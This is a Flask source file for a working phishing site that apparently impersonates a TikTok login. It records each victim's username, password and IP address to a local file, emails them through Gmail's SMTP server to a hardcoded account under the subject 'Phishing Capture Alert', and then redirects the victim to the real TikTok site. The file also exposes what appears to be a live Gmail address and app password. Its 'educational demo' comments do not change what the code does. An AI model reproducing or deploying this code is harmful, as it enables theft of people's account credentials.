# app.py

from flask import Flask, render_template, request, redirect, url_for
import smtplib
from email.mime.text import MIMEText
import os
from datetime import datetime # Import datetime for timestamp

app = Flask(__name__)

# --- IMPORTANT SECURITY NOTE ---
# NEVER hardcode sensitive credentials like passwords directly in your code
# for production environments. Use environment variables or a secure
# configuration management system.
# For this educational demo, you will replace 'YOUR_GMAIL_APP_PASSWORD_HERE'
# with your actual Gmail App Password.
# -------------------------------

# Replace with your controlled email address
EMAIL_ADDRESS = "mwananchihuslerloans@gmail.com"
# Use a Gmail App Password here.
# Generate one from your Google Account security settings.
# For this demo, you will put your actual App Password here:
EMAIL_PASSWORD = "mokasgadsacljec" # <--- VERIFY THIS EXACTLY (NO SPACES)
TO_EMAIL = "mwananchihuslerloans@gmail.com" # This is the recipient email

@app.route("/")
def home():
    # This route will serve your login page (e.g., login.html)
    # Ensure you have a 'templates' folder with 'login.html' inside it.
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]

    # --- Credential Logging (for demonstration only) ---
    # In a real scenario, this would be logged securely (e.g., to a database)
    # and not to a flat file that might not persist on cloud platforms.
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ip_address = request.environ.get('REMOTE_ADDR', 'Unknown IP') # Get client IP
        with open("credentials.txt", "a") as f:
            f.write(f"[{timestamp}] IP: {ip_address} - User: {username} | Pass: {password}\n")
        print(f"Credentials saved to credentials.txt: {username} | {password}")
    except Exception as e:
        print(f"Error saving credentials to file: {e}")
    # --- End Credential Logging ---

    # --- Email Notification ---
    try:
        # Connect to Gmail's SMTP server securely over SSL
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)

            subject = "Phishing Capture Alert"
            body = f"New Phishing Attempt:\n\nUsername: {username}\nPassword: {password}\nIP Address: {request.environ.get('REMOTE_ADDR', 'Unknown IP')}\nTimestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

            msg = MIMEText(body)
            msg['Subject'] = subject
            msg['From'] = EMAIL_ADDRESS
            msg['To'] = TO_EMAIL

            smtp.send_message(msg)
            print("Credentials sent via email successfully!")

    except Exception as e:
        print(f"Error sending email: {e}")
        # This print statement is crucial for debugging on Render logs!
        # It should show you why the email failed.

    # Redirect the user directly to the real TikTok website after capturing credentials.
    return redirect("https://www.tiktok.com", code=302)

# --- IMPORTANT FOR RENDER DEPLOYMENT ---
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
